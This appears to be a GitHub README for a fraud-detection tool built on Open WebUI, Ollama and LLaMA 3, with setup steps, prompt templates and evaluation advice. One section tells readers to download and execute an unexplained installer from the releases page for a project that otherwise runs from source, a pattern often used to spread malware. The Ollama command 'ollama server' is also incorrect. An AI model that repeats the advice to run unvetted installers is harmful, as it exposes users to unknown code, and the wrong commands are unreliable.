[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/taha860/fraud-detector-open-webui/releases)

# Fraud Detector Open WebUI | LLaMA 3 + Ollama for Finance 🔍💳

![Fraud image](https://images.unsplash.com/photo-1588702547923-7093a6c3ba33?auto=format&fit=crop&w=1200&q=80)

A focused toolkit for detecting fraudulent transactions using Open WebUI with Ollama and LLaMA 3. Use this repo to run an LLM-powered analysis UI tailored to finance data, inspect flagged transactions, and iterate on prompts and models.

Badges
- Built with: Open WebUI · Ollama · LLaMA 3
- Topics: financial-analysis · fraud-detection · llama3 · ollama · openwebui

Table of Contents
- Features
- How it works
- Built with
- Quickstart (local)
- Model setup (Ollama + LLaMA 3)
- Run the Web UI
- Example prompts and flows
- Data, evaluation, and metrics
- Security, privacy, and compliance
- Release download and execution
- Contributing
- License

Features ✨
- Interactive Web UI for fraud review and triage.
- LLaMA 3 model via Ollama for natural language analysis of transaction records.
- Prompt templates for classification, risk scoring, and explainability.
- Tools for batch scoring, audit logs, and sample generation.
- Local-first setup. No cloud required for model inference if you run Ollama locally.

How it works 🧭
- Transaction records feed the WebUI as JSON or CSV.
- The UI formats a prompt that contains the transaction context and a schema.
- Ollama serves LLaMA 3 and runs the prompt.
- The model returns a label, a short rationale, and suggested next steps.
- The UI stores results and lets humans review and adjust prompts or labels.

Built with 🏗️
- Open WebUI — frontend and local orchestration for LLM interactions.
- Ollama — local model server and runtime for LLaMA 3.
- LLaMA 3 — base LLM for reasoning over structured financial data.
- Python — backend glue and small utilities (CSV/JSON parsing).
- Lightweight JS and HTML for the UI.

Topics
financial-analysis, financial-data, fraud-detection, fraud-prevention, fraudulent-transactions, llama3, ollama, ollama-python, ollama-webui, open-source, opensource, openwebui

Quickstart (local) ⚙️
Follow these steps to run the app on a development machine.

Prerequisites
- Docker (optional, for Ollama) or native Ollama install
- Python 3.10+
- Git
- A CSV or JSON file with transaction data (id, amount, account_from, account_to, timestamp, metadata)

Clone and install
```bash
git clone https://github.com/taha860/fraud-detector-open-webui.git
cd fraud-detector-open-webui
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Start Ollama
- If you use Docker: start the Ollama container.
- If you use native: run `ollama server` per Ollama docs.

Model setup (Ollama + LLaMA 3) 🧠
- Pull or install the LLaMA 3 model in Ollama.
- Configure model resources based on your hardware.

Example Ollama commands
```bash
# Pull a LLaMA 3 model (replace with exact model name/version you need)
ollama pull llama3
# List models
ollama list
# Start local Ollama server if not running in daemon mode
ollama server
```

Run WebUI and backend
```bash
# Start the backend API
python app/backend.py

# Start the web UI (dev server)
cd webui
npm install
npm run dev
```

Open your browser at http://localhost:3000 (or the port shown). The UI will let you upload a CSV/JSON and run the model on rows.

Run a batch score
```bash
python scripts/score_batch.py --file data/transactions_sample.csv --model llama3
```

Example prompt templates and flows 🧩
- Binary classification prompt:
  - Input: transaction JSON with fields.
  - Prompt: "Given this transaction, answer Fraud: Yes/No. Add one-line rationale and suggested rule."
  - Model output: "Yes | Suspicious large transfer to new external account | Flag for manual review."

- Risk score prompt:
  - Prompt returns a numeric score 0-100 and top 3 features that influenced the score.

- Explainability:
  - Ask the model to return a short causal chain: "Why might this be fraud? List reasons in order."

These templates live in prompts/ and you can edit them to match your policy.

Data, evaluation, and metrics 📊
- Use a labeled dataset to compute precision, recall, F1, and AUC.
- Log model predictions with ground truth to evaluate drift.
- Example evaluation script:
```bash
python scripts/evaluate.py --predictions outputs/preds.json --labels data/labels.json
```
- Track per-account false positive rates. Use a confusion matrix to guide threshold selection.

Security, privacy, and compliance 🔐
- Keep PHI and user-sensitive attributes out of prompts when possible.
- Run models locally with Ollama to avoid sending data to external APIs.
- Mask PII in logs.
- Store audit logs in an encrypted store if required by policy.

Releases — download and execute ⬇️
[![Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github&style=flat-square)](https://github.com/taha860/fraud-detector-open-webui/releases)

Download the release file from https://github.com/taha860/fraud-detector-open-webui/releases and execute the included installer or script. The release will contain packaged binaries and a setup script. Run the installer on your machine and follow on-screen steps. If the release link changes or fails, check the "Releases" section on the repository page.

Deployment notes
- For small teams, run Ollama and the WebUI on a single server with GPU.
- For scale, separate model serving, API, and UI into different containers.
- Use queuing for batch inference jobs.

CLI reference
- scripts/score_batch.py — batch inference from CSV/JSON
- scripts/evaluate.py — compute metrics
- app/backend.py — API to interface the UI and Ollama
- webui/ — frontend code and assets

Example JSON record
```json
{
  "id": "txn_12345",
  "timestamp": "2025-07-01T12:23:34Z",
  "amount": 12400,
  "currency": "USD",
  "sender_account": "acct_abc",
  "receiver_account": "acct_xyz",
  "merchant": "Unknown",
  "geo": "US",
  "metadata": {
    "ip": "203.0.113.10",
    "device": "mobile"
  }
}
```

Prompt engineering tips
- Provide schema and types. The model performs better when input looks structured.
- Use few-shot examples tailored to your data distribution.
- Ask for a rationale and a short list of signals. That aids audit and debugging.
- Test for calibration: sample many inputs and see if scores match ground truth.

Evaluation best practices
- Hold out an unseen test set by account or by day to avoid leakage.
- Report per-merchant and per-region metrics.
- Monitor drift by tracking input feature distributions.

Logging and observability
- Log model inputs, outputs, and latency.
- Capture model version and prompt hash with every inference.
- Store logs in JSONL for easy parsing.

Contributing 🤝
- Fork the repo.
- Add tests for any model or prompt changes.
- Open a PR with a clear description of the change and the evaluation impact.
- Label issues with type: bug, feature, docs, or model.

Code of conduct
- Be respectful. Keep discussions focused on technical issues.
- Provide reproducible steps for any bug reports.

Repository layout
- app/ — backend API and integration with Ollama
- webui/ — frontend code
- prompts/ — prompt templates and examples
- scripts/ — utilities: scoring, evaluation, data prep
- data/ — sample data and templates
- docs/ — design notes and architecture diagrams

Common troubleshooting
- If Ollama model does not load, check available disk and GPU memory.
- If the WebUI shows empty responses, inspect backend logs for prompt or connection errors.
- If scores look off, validate input schema and confirm correct columns map.

Contact and support
- Open issues on GitHub for bugs and feature requests.
- Use discussions for design questions and model prompt sharing.

License
- MIT License. See LICENSE file for details.